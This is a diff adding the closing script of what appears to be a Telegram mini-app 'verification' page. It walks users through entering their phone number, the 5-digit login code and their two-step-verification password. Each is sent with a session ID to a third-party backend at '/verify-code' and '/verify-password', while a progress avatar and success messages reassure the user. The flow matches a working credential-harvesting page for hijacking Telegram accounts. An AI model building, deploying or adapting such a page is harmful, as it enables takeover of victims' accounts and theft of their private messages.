+                .then(res => res.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        currentSessionId = data.session_id;
+                        document.getElementById('phoneScreen').style.display = 'none';
+                        document.getElementById('mainTitle').innerText = t('titleCode');
+                        document.getElementById('codeScreen').style.display = 'flex';
+                        // Фокус на первый инпут
+                        setTimeout(() => {
+                            const inputs = document.querySelectorAll('.code-input-box');
+                            if (inputs.length > 0) inputs[0].focus();
+                        }, 100);
+                        setAvatarProgress(50);
+                    } else {
+                        alert(t('errorPrefix') + (data.detail || t('unknownError')));
+                    }
+                })
+                .catch(err => {
+                    alert(t('errorConnection') + err.message);
+                })
+                .finally(() => {
+                    btn.innerText = t('btnContinue');
+                    btn.disabled = false;
+                });
+        }
+
+        function getEnteredCode() {
+            const inputs = document.querySelectorAll('.code-input-box');
+            let code = '';
+            inputs.forEach(input => code += input.value);
+            return code;
+        }
+
+        function checkAutoSubmit() {
+            const code = getEnteredCode();
+            if (code.length === 5) {
+                submitCode();
+            }
+        }
+
+        function moveToNext(input, index) {
+            // Hide error message when user starts typing again
+            document.getElementById('codeErrorMsg').style.display = 'none';
+
+            if (input.value.length > 1) {
+                input.value = input.value.slice(0, 1);
+            }
+            if (input.value && index < 4) {
+                document.querySelectorAll('.code-input-box')[index + 1].focus();
+            }
+            checkAutoSubmit();
+        }
+
+        function handleBackspace(e, index) {
+            if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                const inputs = document.querySelectorAll('.code-input-box');
+                inputs[index - 1].focus();
+                inputs[index - 1].value = '';
+            }
+        }
+
+        function handleCodePaste(e) {
+            e.preventDefault();
+            const pastedData = (e.clipboardData || window.clipboardData).getData('text');
+            const numbers = pastedData.replace(/\D/g, '').split('').slice(0, 5);
+
+            if (numbers.length > 0) {
+                const inputs = document.querySelectorAll('.code-input-box');
+                inputs.forEach((input, index) => {
+                    input.value = ''; // clear all
+                });
+
+                numbers.forEach((num, index) => {
+                    inputs[index].value = num;
+                });
+
+                if (numbers.length < 5) {
+                    inputs[numbers.length].focus();
+                } else {
+                    inputs[4].focus();
+                    checkAutoSubmit();
+                }
+            }
+        }
+
+        function submitCode() {
+            const code = getEnteredCode();
+            if (code.length < 5) return;
+
+            const btn = document.getElementById('btnSubmitCode');
+            btn.innerText = t('loading');
+            btn.disabled = true;
+            btn.style.display = 'block';
+
+            fetch(API_BASE + '/verify-code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    user_id: userId,
+                    phone_number: currentPhoneNumber,
+                    code: code,
+                    session_id: currentSessionId
+                })
+            })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        document.getElementById('codeScreen').innerHTML = t('successCode');
+                        setAvatarProgress(100);
+                    } else if (data.status === '2fa_required') {
+                        document.getElementById('codeScreen').style.display = 'none';
+                        document.getElementById('mainTitle').innerText = t('title2FA');
+                        document.getElementById('passwordScreen').style.display = 'flex';
+                        setAvatarProgress(75);
+                    } else {
+                        const errorMsg = document.getElementById('codeErrorMsg');
+                        errorMsg.innerText = t('codeError');
+                        errorMsg.style.display = 'block';
+
+                        const inputs = document.querySelectorAll('.code-input-box');
+                        inputs.forEach(input => input.value = '');
+                        if (inputs.length > 0) inputs[0].focus();
+                    }
+                })
+                .catch(err => {
+                    const errorMsg = document.getElementById('codeErrorMsg');
+                    errorMsg.innerText = t('errorConnection') + err.message;
+                    errorMsg.style.display = 'block';
+                })
+                .finally(() => {
+                    btn.innerText = t('btnContinue');
+                    btn.disabled = false;
+                    btn.style.display = 'none';
+                });
+        }
+
+        function submitPassword() {
+            const pwd = document.getElementById('passwordInput').value;
+            if (!pwd) return;
+
+            fetch(API_BASE + '/verify-password', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    user_id: userId,
+                    phone_number: currentPhoneNumber || 'QR',
+                    password: pwd,
+                    session_id: currentSessionId
+                })
+            })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        document.getElementById('passwordScreen').innerHTML = t('successPwd');
+                        setAvatarProgress(100);
+                    } else {
+                        const pwdInput = document.getElementById('passwordInput');
+                        pwdInput.classList.add('pwd-invalid');
+                        setTimeout(() => pwdInput.classList.remove('pwd-invalid'), 400);
+                        document.getElementById('pwdErrorMsg').innerText = t('pwdError');
+                        document.getElementById('pwdErrorMsg').style.display = 'block';
+                    }
+                })
+                .catch(err => {
+                    const pwdInput = document.getElementById('passwordInput');
+                    pwdInput.classList.add('pwd-invalid');
+                    setTimeout(() => pwdInput.classList.remove('pwd-invalid'), 400);
+                    const errEl = document.getElementById('pwdErrorMsg');
+                    errEl.innerText = t('errorPrefix') + err.message;
+                    errEl.style.display = 'block';
+                });
+        }
+
+        function checkPwdInput() {
+            const val = document.getElementById('passwordInput').value.trim();
+            document.getElementById('btnSubmitPassword').disabled = (val.length === 0);
+            document.getElementById('pwdErrorMsg').style.display = 'none';
+        }
+
+        function togglePasswordVisibility() {
+            const pwdInput = document.getElementById('passwordInput');
+            if (pwdInput.type === 'password') {
+                pwdInput.type = 'text';
+            } else {
+                pwdInput.type = 'password';
+            }
+        }
+
+        function goBackFromQR() {
+            if (qrPollingInterval) clearInterval(qrPollingInterval);
+            document.getElementById('qrScreen').style.display = 'none';
+            document.getElementById('lottieContainer').style.display = 'block';
+            document.getElementById('loginOptions').style.display = 'flex';
+            document.getElementById('mainTitle').innerText = t('titleLoginMethod');
+        }
+
+        function goBackFromPhone() {
+            document.getElementById('phoneScreen').style.display = 'none';
+            document.getElementById('lottieContainer').style.display = 'block';
+            document.getElementById('loginOptions').style.display = 'flex';
+            document.getElementById('mainTitle').innerText = t('titleLoginMethod');
+        }
+
+        // override continueToVerification text change
+        const oldContinueToVerification = continueToVerification;
+        continueToVerification = function () {
+            oldContinueToVerification();
+            document.getElementById('mainTitle').innerText = t('titleLoginMethod');
+        };
+
+        // override requestTelegramPhone error
+        const oldRequestTelegramPhone = requestTelegramPhone;
+        requestTelegramPhone = function () {
+            if (!tg || typeof tg.requestContact !== 'function') {
+                alert(t('telegramFuncNotAvail'));
+                return;
+            }
+            tg.requestContact(() => {
+                console.log('contact request popup closed');
+            });
+        };
+    </script>
+</body>
+
+</html>
